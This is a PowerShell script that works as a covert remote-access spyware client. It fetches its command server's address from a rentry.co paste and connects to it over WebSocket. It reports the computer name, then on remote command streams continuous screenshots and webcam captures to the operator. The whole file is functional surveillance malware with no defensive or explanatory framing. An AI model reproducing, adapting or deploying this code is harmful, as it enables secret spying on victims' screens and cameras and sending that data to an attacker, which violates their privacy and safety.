
$Headers = @{
    "Referer" = "https://rentry.co/"
}


function Invoke-Request {
    param(
        [string]$url,
        [string]$method,
        [hashtable]$headers,
        [hashtable]$body
    )

    $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
    $response = Invoke-WebRequest -Uri $url -Method $method -Headers $headers -Body $body -WebSession $session
    return $response
}



function Get-Raw {
    param(
        [string]$url
    )

    $rawUrl = "https://rentry.co/api/raw/$url"
    $response = Invoke-Request -url $rawUrl -method "GET" -headers $Headers
    return (ConvertFrom-Json $response.Content)
}


#-----------------------------

Install-Module -Name ThreadJob -RequiredVersion 2.0.0 -force

Add-Type -TypeDefinition @"
    using System;
    using System.IO;
    using System.Drawing;
    using System.Windows.Forms;
    using System.Drawing.Imaging;
    using System.Runtime.InteropServices;
    
    public class ScreenCapture
    {
        public byte[] CaptureScreen()
        {
            using (var stream = new MemoryStream())
            {
                Rectangle bounds = Screen.GetBounds(Point.Empty);
                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                    }
                    bitmap.Save(stream, ImageFormat.Jpeg);
                }
                return stream.ToArray();
            }
        }
    }

    public class CameraCapture
    {
        private const short WM_CAP = 0x400;
        private const int WM_CAP_DRIVER_CONNECT = 0x40a;
        private const int WM_CAP_DRIVER_DISCONNECT = 0x40b;
        private const int WM_CAP_EDIT_COPY = 0x41e;

        [DllImport("avicap32.dll")]
        protected static extern int capCreateCaptureWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszWindowName,
            int dwStyle, int x, int y, int nWidth, int nHeight, int hWndParent, int nID);

        [DllImport("user32", EntryPoint = "SendMessageA")]
        protected static extern int SendMessage(int hwnd, int wMsg, int wParam, [MarshalAs(UnmanagedType.AsAny)] object lParam);

        [DllImport("user32")]
        protected static extern bool DestroyWindow(int hwnd);

        private int _deviceIndex;
        private int _deviceHandle;

        public CameraCapture(int deviceIndex)
        {
            _deviceIndex = deviceIndex;
        }

        public static CameraCapture Create(int deviceIndex)
        {
            return new CameraCapture(deviceIndex);
        }

        public void Start()
        {
            string deviceIndexString = Convert.ToString(_deviceIndex);
            _deviceHandle = capCreateCaptureWindowA(ref deviceIndexString, 0, 0, 0, 0, 0, 0, 0);

            if (SendMessage(_deviceHandle, WM_CAP_DRIVER_CONNECT, _deviceIndex, 0) > 0)
            {
                SendMessage(_deviceHandle, WM_CAP_EDIT_COPY, 0, 0);
            }
        }

        public void Stop()
        {
            SendMessage(_deviceHandle, WM_CAP_DRIVER_DISCONNECT, _deviceIndex, 0);
            DestroyWindow(_deviceHandle);
        }

        public Bitmap GetFrame()
        {
            IDataObject data = Clipboard.GetDataObject();
            if (data.GetDataPresent(typeof(Bitmap)))
            {
                return (Bitmap)data.GetData(typeof(Bitmap));
            }
            return null;
        }
    }

"@ -ReferencedAssemblies "System.Windows.Forms", "System.Drawing"


function Send-Image {
    param(
        [string]$endmsg,
        [System.Net.WebSockets.ClientWebSocket]$webSocket,
        [string]$base64Image
    )

    $bufferSize = 4096
    $offset = 0
    $stringLength = $base64Image.Length

    while ($offset -lt $stringLength) {
        $remainingLength = $stringLength - $offset
        $lengthToSend = [Math]::Min($bufferSize, $remainingLength)
        $partialData = $base64Image.Substring($offset, $lengthToSend)
        $buffer = [System.Text.Encoding]::UTF8.GetBytes($partialData)
        $sendTask = $webSocket.SendAsync([System.ArraySegment[byte]]::new($buffer), [System.Net.WebSockets.WebSocketMessageType]::Text, $false, [System.Threading.CancellationToken]::None)
        try {
            $sendTask.Wait()
        }catch [AggregateException] {
            $_.Exception.InnerExceptions | ForEach-Object {
                Write-Host $_.Message
                if ($_.InnerException -ne $null) {
                    Write-Host "InnerException: $($_.InnerException.Message)"
                }
            }
            return
        }

        $offset += $lengthToSend
    }

    $endOfImageBuffer = [System.Text.Encoding]::UTF8.GetBytes($endmsg)
    $sendTask = $webSocket.SendAsync([System.ArraySegment[byte]]::new($endOfImageBuffer), [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None)
    try {
        $sendTask.Wait()
    } catch [AggregateException] {
        $_.Exception.InnerExceptions | ForEach-Object {
            Write-Host $_.Message
        }
    }
}

function Write-Log {
    param(
        [string]$Message,
        [string]$LogFile = "debug.log"
    )

    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logMessage = "$timestamp - $Message"
    Add-Content -Path $LogFile -Value $logMessage
}


function Main {

    $rawData = Get-Raw "QZEOPJHOZgbuioebopmammazpodepfonzZEGnpazfoi71951uzebf55684651699985"
    $ServerIP = $rawData.content
    $Port = 8559

    $syncHash = [hashtable]::Synchronized(@{})
    $job = $null
    $jobcam = $null


    $webSocket = New-Object System.Net.WebSockets.ClientWebSocket
    $cancellationToken = New-Object System.Threading.CancellationToken
    $webSocket.Options.UseDefaultCredentials = $true
    $StreamURI = "ws://${ServerIP}:${Port}"
    $connection = $webSocket.ConnectAsync($StreamURI, $cancellationToken)
    $connection.Wait()

    $recvBuffer = New-Object byte[] 1024
    $recvSegment = [System.ArraySegment[byte]]::new($recvBuffer)
    $recvResult = $webSocket.ReceiveAsync($recvSegment, $cancellationToken)
    $recvResult.Wait()

    $message = [System.Text.Encoding]::UTF8.GetString($recvBuffer, 0, $recvResult.Result.Count)
    if ($message -eq "request_name") {
        $name = $env:COMPUTERNAME
        $sendBuffer = [System.Text.Encoding]::UTF8.GetBytes($name)
        $sendSegment = [System.ArraySegment[byte]]::new($sendBuffer)
        $sendResult = $webSocket.SendAsync($sendSegment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None)
        $sendResult.Wait()
    }

    while ($true) {
        if ($webSocket.State -eq [System.Net.WebSockets.WebSocketState]::Aborted -or
            $webSocket.State -eq [System.Net.WebSockets.WebSocketState]::Closed -or
            $webSocket.State -eq [System.Net.WebSockets.WebSocketState]::CloseReceived) {
            break
        }

        $recvBuffer = New-Object byte[] 1024
        $recvSegment = [System.ArraySegment[byte]]::new($recvBuffer)
        $recvResult = $webSocket.ReceiveAsync($recvSegment, $cancellationToken)
        $recvResult.Wait()

        $message = [System.Text.Encoding]::UTF8.GetString($recvBuffer, 0, $recvResult.Result.Count)
        if ($message -eq "start_screen_sharing") {
            $syncHash.continueSharing = $true
            $def = ${function:Send-Image}

            $scriptBlock = {
                param(
                    $syncHash,
                    [System.Net.WebSockets.ClientWebSocket]$webSocket
                )
                   
                ${function:Send-Image} = $using:def

                $screenCapture = New-Object ScreenCapture

                while ($syncHash.continueSharing) {
                    $imageData = $screenCapture.CaptureScreen()
                    $base64Image = [Convert]::ToBase64String($imageData)
                    Send-Image -endmsg "END_OF_IMAGE" -webSocket $webSocket -base64Image $base64Image

                    Start-Sleep -Milliseconds 33
                }
                return

            } 

            $job = Start-ThreadJob -ScriptBlock $scriptBlock -ArgumentList $syncHash, $webSocket 

        } elseif ($message -eq "stop_screen_sharing") {
           
            $syncHash.continueSharing = $false
            
        } elseif ($message -eq "start_camera_sharing") {
            $syncHash.continueSharingCam = $true
            #$defCam = ${function:Send-Image}

            

            #$scriptBlockCam = {
            #    param(
            #        $syncHash,
            #        [System.Net.WebSockets.ClientWebSocket]$webSocket
            #    )

            #    ${function:Send-Image} = $using:defCam

            $cameraCapture = [CameraCapture]::Create(0)

            $cameraCapture.Start()
            #while ($syncHash.continueSharingCam) {
            $frame = $cameraCapture.GetFrame()

            if ($frame -ne $null) {
                $syncHash.continueSharingCam = $true
                $imageData = [System.IO.MemoryStream]::new()
                $frame.Save($imageData, [System.Drawing.Imaging.ImageFormat]::Jpeg)


                $base64Image = [Convert]::ToBase64String($imageData.ToArray())
                Send-Image -endmsg "END_OF_IMAGE_CAM" -webSocket $webSocket -base64Image $base64Image
            }

            Start-Sleep -Milliseconds 33

                #}
            $cameraCapture.Stop()

                #return
            #}

            #$jobcam = Start-ThreadJob -ScriptBlock $scriptBlockCam -ArgumentList $syncHash, $webSocket

            
        } elseif ($message -eq "stop_camera_sharing") {
           
            $syncHash.continueSharingCam = $false
            
        } elseif ($message -eq "kick") {
            $syncHash.continueSharing = $false
            $syncHash.continueSharingCam = $false

            Get-Job | Remove-Job -Force
            $webSocket.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "Kicked by server", $cancellationToken).Wait()
            break
        }

        Start-Sleep -Milliseconds 100
    }
    Get-Job | Remove-Job -Force
}

Main
